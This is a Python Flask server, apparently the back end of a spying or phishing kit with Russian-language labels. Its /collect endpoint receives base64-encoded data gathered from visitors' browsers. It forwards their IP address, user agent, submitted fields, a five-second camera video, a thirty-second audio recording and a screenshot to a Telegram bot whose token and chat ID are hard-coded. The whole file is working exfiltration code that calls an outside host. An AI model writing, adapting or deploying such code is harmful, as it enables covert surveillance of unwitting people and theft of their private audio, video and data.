import requests
import base64
import json
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8820194857:AAEcT1qBpODtvkUK58MfJT77_U9iVRplapg"
CHAT_ID = "912559442"

def send_tg(text, file_bytes=None, filename="file"):
    try:
        if file_bytes:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {"document": (filename, file_bytes, "application/octet-stream")}
            data = {"chat_id": CHAT_ID, "caption": text[:200]}
            requests.post(url, data=data, files=files, timeout=15)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
    except Exception as e:
        print("TG error:", e)

def decode_data(encoded):
    try:
        decoded = base64.b64decode(encoded).decode('utf-8')
        return json.loads(decoded)
    except:
        return None

@app.route("/")
def index():
    return open("index.html", encoding="utf-8").read()

@app.route("/collect", methods=["POST"])
def log():
    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
        return jsonify({"error": "bad request"}), 400
    
    encrypted = request.data.decode('utf-8')
    data = decode_data(encrypted)
    if not data:
        return jsonify({"error": "decode failed"}), 400
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    msg = f"<b>🔥 НОВЫЙ ОТЧЁТ</b>\n"
    msg += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"🌍 IP: {ip}\n"
    msg += f"📱 User-Agent: {ua[:100]}\n\n"
    
    text_fields = {k:v for k,v in data.items() 
                   if not k.endswith('_base64') and k not in ['audio_base64', 'video_base64', 'screen_base64']}
    
    for k, v in text_fields.items():
        if v:
            msg += f"<b>{k}</b>: {str(v)[:200]}\n"
    
    send_tg(msg)
    
    if data.get("video_base64"):
        video_bytes = base64.b64decode(data["video_base64"])
        send_tg("🎥 ВИДЕО С КАМЕРЫ (5 сек)", file_bytes=video_bytes, filename="video.webm")
    
    if data.get("audio_base64"):
        audio_bytes = base64.b64decode(data["audio_base64"])
        send_tg("🎙️ АУДИОЗАПИСЬ (30 сек)", file_bytes=audio_bytes, filename="audio.webm")
    
    if data.get("screen_base64"):
        scr_bytes = base64.b64decode(data["screen_base64"])
        send_tg("🖥️ СКРИНШОТ ЭКРАНА", file_bytes=scr_bytes, filename="screen.jpg")
    
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
